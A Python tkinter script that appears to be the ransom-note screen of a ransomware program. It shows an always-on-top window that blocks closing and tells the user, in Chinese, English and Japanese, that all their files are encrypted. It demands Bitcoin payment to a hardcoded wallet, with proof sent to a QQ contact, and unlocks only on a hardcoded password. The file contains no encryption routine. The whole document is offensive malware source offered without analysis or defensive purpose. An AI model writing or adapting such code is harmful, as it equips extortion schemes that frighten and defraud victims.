import tkinter as tk
from tkinter import ttk, messagebox
import threading
import time

RANSOM_PASSWORD = "a1b2c3d4e5f67890"
RANSOM_BITCOIN_ADDR = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
RANSOM_QQ = "3940299076"

def run():
    root = tk.Tk()
    root.title("")
    root.geometry("700x560")
    root.configure(bg='#1a1a2e')
    root.attributes('-topmost', True)

    root.protocol("WM_DELETE_WINDOW", lambda: None)
    root.bind('<Alt-F4>', lambda e: 'break')

    lang = "cn"
    texts = {
        "cn": {
            "title": "您的文件已被加密",
            "subtitle": "您电脑上的所有文档、照片、数据库等均已被加密！",
            "instructions": f"如何恢复文件？\n1. 支付价值10美元的比特币到以下地址\n{RANSOM_BITCOIN_ADDR}\n2. 将交易截图发送至QQ：{RANSOM_QQ}\n3. 验证后发送解密密码\n\n警告：请勿尝试自行解密！",
            "enter_pwd": "输入解锁密码：",
            "unlock": "解锁",
            "wrong": "密码错误，重试",
            "success": "文件已成功解密！"
        },
        "en": {
            "title": "Your Files Are Encrypted",
            "subtitle": "All your documents, photos, databases have been encrypted!",
            "instructions": f"To recover:\n1. Pay 10 USD in Bitcoin to {RANSOM_BITCOIN_ADDR}\n2. Send proof to QQ: {RANSOM_QQ}\n3. We'll send decryption password.",
            "enter_pwd": "Enter password:",
            "unlock": "Unlock",
            "wrong": "Wrong password",
            "success": "Files decrypted!"
        },
        "ja": {
            "title": "ファイルは暗号化されました",
            "subtitle": "すべてのドキュメント、写真、データベースが暗号化されました！",
            "instructions": f"復元方法:\n1. 10ドル分のBTCを {RANSOM_BITCOIN_ADDR} に送金\n2. 証拠をQQ {RANSOM_QQ} に送信\n3. 復号パスワードをメールで送信",
            "enter_pwd": "復号パスワード:",
            "unlock": "復号",
            "wrong": "パスワードが間違っています",
            "success": "復号成功！"
        }
    }

    def switch_lang(code):
        nonlocal lang
        lang = code
        refresh_ui()

    def refresh_ui():
        for w in body.winfo_children():
            w.destroy()
        t = texts[lang]
        tk.Label(body, text=t["title"], font=("微软雅黑", 18, "bold"),
                 fg='#ff4444', bg='#1a1a2e').pack(pady=15)
        tk.Label(body, text=t["subtitle"], font=("微软雅黑", 12),
                 fg='#dddddd', bg='#1a1a2e', wraplength=650).pack(pady=5)
        instr = tk.Text(body, font=("Consolas", 10), bg='#0f0f1a', fg='#aaffaa',
                        wrap='word', height=12, width=70)
        instr.insert('1.0', t["instructions"])
        instr.config(state='disabled')
        instr.pack(pady=15)

        pwd_frame = tk.Frame(body, bg='#1a1a2e')
        pwd_frame.pack(pady=10)
        tk.Label(pwd_frame, text=t["enter_pwd"], fg='white', bg='#1a1a2e').pack(side='left', padx=5)
        entry = tk.Entry(pwd_frame, show='*', font=("Arial", 12), width=22)
        entry.pack(side='left', padx=5)

        progress = ttk.Progressbar(body, orient='horizontal', length=400, mode='indeterminate')
        status = tk.Label(body, text="", fg='#cccccc', bg='#1a1a2e')

        def decrypt():
            pwd = entry.get()
            if not pwd:
                messagebox.showerror("", t["wrong"])
                return
            btn.config(state='disabled')
            progress.pack(pady=5)
            status.pack()
            progress.start(10)
            status.config(text="正在解密，请稍候...")

            def do():
                time.sleep(2)
                if pwd == RANSOM_PASSWORD:
                    root.after(0, lambda: messagebox.showinfo("", t["success"]))
                    root.after(0, root.destroy)
                else:
                    root.after(0, progress.pack_forget)
                    root.after(0, status.pack_forget)
                    root.after(0, lambda: btn.config(state='normal'))
                    root.after(0, lambda: messagebox.showerror("", t["wrong"]))

            threading.Thread(target=do, daemon=True).start()

        btn = tk.Button(pwd_frame, text=t["unlock"], command=decrypt,
                        bg='#ff8800', fg='white', font=("微软雅黑", 12))
        btn.pack(side='left', padx=5)

        lang_frame = tk.Frame(body, bg='#1a1a2e')
        lang_frame.pack(pady=10)
        for name, code in [("中文","cn"), ("English","en"), ("日本語","ja")]:
            tk.Button(lang_frame, text=name, width=8,
                      command=lambda c=code: switch_lang(c),
                      bg='#333', fg='white', font=("微软雅黑", 8)).pack(side='left', padx=2)

    body = tk.Frame(root, bg='#1a1a2e')
    body.pack(fill='both', expand=True, padx=20, pady=20)
    refresh_ui()

    root.mainloop()

if __name__ == "__main__":
    run()